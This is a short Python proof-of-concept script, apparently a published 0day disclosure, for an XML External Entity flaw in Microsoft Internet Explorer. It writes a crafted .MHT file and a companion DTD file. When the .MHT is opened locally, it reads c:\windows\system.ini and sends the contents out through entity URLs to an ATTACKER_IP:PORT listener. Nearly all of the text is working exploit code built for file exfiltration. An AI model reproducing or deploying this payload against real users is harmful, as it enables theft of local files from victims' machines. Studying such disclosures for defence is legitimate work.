#Microsoft Internet Explorer XXE 0day
#Creates malicious XXE .MHT and XML files
#Open the MHT file in MSIE locally, should exfil system.ini
#By hyp3rlinx 
#ApparitionSec

ATTACKER_IP="localhost"
PORT="8000"

mht_file=(
'From:\n'
'Subject:\n'
'Date:\n'
'MIME-Version: 1.0\n'
'Content-Type: multipart/related; type="text/html";\n'
'\tboundary="=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001"\n'
'This is a multi-part message in MIME format.\n\n\n'

'--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\n'
'Content-Type: text/html; charset="UTF-8"\n'
'Content-Location: main.htm\n\n'

'<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/transitional.dtd">\n'
'<html>\n'
'<head>\n'
'<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\n'
'<title>MSIE XXE 0day</title>\n'
'</head>\n'
'<body>\n'
'<xml>\n'
'<?xml version="1.0" encoding="utf-8"?>\n'
'<!DOCTYPE r [\n'
'<!ELEMENT r ANY >\n'
'<!ENTITY % sp SYSTEM "http://'+str(ATTACKER_IP)+":"+PORT+'/datatears.xml">\n'
'%sp;\n'
'%param1;\n'
']>\n'
'<r>&exfil;</r>\n'
'<r>&exfil;</r>\n'
'<r>&exfil;</r>\n'
'<r>&exfil;</r>\n'
'</xml>\n'
'<script>window.print();</script>\n'
'<table cellpadding="0" cellspacing="0" border="0">\n'
'<tr>\n'
'<td class="contentcell-width">\n'
'<h1>MSIE XML External Entity 0day PoC.</h1>\n'
'<h3>Discovery: hyp3rlinx</h3>\n'
'<h3>ApparitionSec</h3>\n'
'</td>\n'
'</tr>\n'
'</table>\n'
'</body>\n'
'</html>\n\n\n'

'--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--'
)

xml_file=(
'<!ENTITY % data SYSTEM "c:\windows\system.ini">\n'
'<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://'+str(ATTACKER_IP)+":"+PORT+'/?%data;\'>">\n'
'<!ENTITY % data SYSTEM "file:///c:/windows/system.ini">\n'
'<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://'+str(ATTACKER_IP)+":"+PORT+'/?%data;\'>">\n'
)

def mk_msie_0day_filez(f,p):
    f=open(f,"wb")
    f.write(p)
    f.close()


if __name__ == "__main__":
    mk_msie_0day_filez("msie-xxe-0day.mht",mht_file)
    mk_msie_0day_filez("datatears.xml",xml_file)
    print "Microsoft Internet Explorer XML External Entity 0day PoC."
    print "Files msie-xxe-0day.mht and datatears.xml Created!."
    print "Discovery: Hyp3rlinx / Apparition Security"
